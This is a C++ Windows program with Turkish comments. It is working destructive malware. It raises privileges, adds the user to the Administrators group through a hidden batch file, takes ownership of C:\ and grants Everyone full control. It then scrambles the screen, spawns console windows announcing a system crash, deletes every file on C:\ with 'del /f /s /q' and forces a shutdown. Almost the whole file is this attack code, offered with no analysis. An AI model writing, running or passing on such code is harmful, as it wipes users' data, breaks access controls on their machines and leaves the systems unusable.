#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <fstream>
#include <iostream>
#include <sddl.h>
#include <aclapi.h>
#include <shellapi.h>

class StealthUnlocker {
public:
    static bool EnablePriv(const wchar_t* priv) {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
            return false;
        
        TOKEN_PRIVILEGES tp = {0};
        if (!LookupPrivilegeValueW(NULL, priv, &tp.Privileges[0].Luid)) {
            CloseHandle(hToken);
            return false;
        }
        
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, 0);
        CloseHandle(hToken);
        return true;
    }

    static bool Unlock(const wchar_t* path) {
        // Hata veren yerler L"..." ile düzeltildi
        EnablePriv(L"SeTakeOwnershipPrivilege");
        EnablePriv(L"SeRestorePrivilege");
        EnablePriv(L"SeBackupPrivilege");
        
        PSID pAdmin;
        if (ConvertStringSidToSidW(L"S-1-5-32-544", &pAdmin)) {
            SetNamedSecurityInfoW((LPWSTR)path, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pAdmin, NULL, NULL, NULL);
            LocalFree(pAdmin);
        }
        
        PSID pEveryone;
        if (ConvertStringSidToSidW(L"S-1-1-0", &pEveryone)) {
            EXPLICIT_ACCESS_W ea = {0};
            ea.grfAccessPermissions = GENERIC_ALL;
            ea.grfAccessMode = SET_ACCESS;
            ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
            ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
            ea.Trustee.ptstrName = (LPWSTR)pEveryone;
            
            PACL pNewDacl = NULL;
            SetEntriesInAclW(1, &ea, NULL, &pNewDacl);
            SetNamedSecurityInfoW((LPWSTR)path, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL);
            
            if(pNewDacl) LocalFree(pNewDacl);
            LocalFree(pEveryone);
        }
        return true;
    }
};

int main() {
    // 1. Kullanıcıyı Admin Yapma (.bat gizli çalışır)
    std::ofstream bat("admin.bat");
    if (bat.is_open()) {
        bat << "@echo off\n";
        bat << "net localgroup Administrators %username% /add >nul 2>&1\n";
        bat << "net localgroup Yoneticiler %username% /add >nul 2>&1\n";
        bat.close();
    }
    ShellExecuteW(NULL, L"runas", L"admin.bat", NULL, NULL, SW_HIDE);

    // 2. Sistem Kilidini Aç
    StealthUnlocker::Unlock(L"C:\\");

    // 3. Ekranı Bozan Grafik Efekti
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    for (int i = 0; i < 500; i++) {
        BitBlt(hdc, rand() % 25, rand() % 25, w, h, hdc, rand() % 25, rand() % 25, NOTSRCERASE);
        Sleep(2);
    }

    // 4. CMD Pencereleri Aç
    for (int i = 0; i < 15; i++) {
        system("start cmd.exe /k echo SISTEM COKTU");
    }

    // 5. DOSYA SİLME VE KAPATMA
    system("del /f /s /q C:\\*");
    system("shutdown /s /t 0 /f");

    return 0;
}

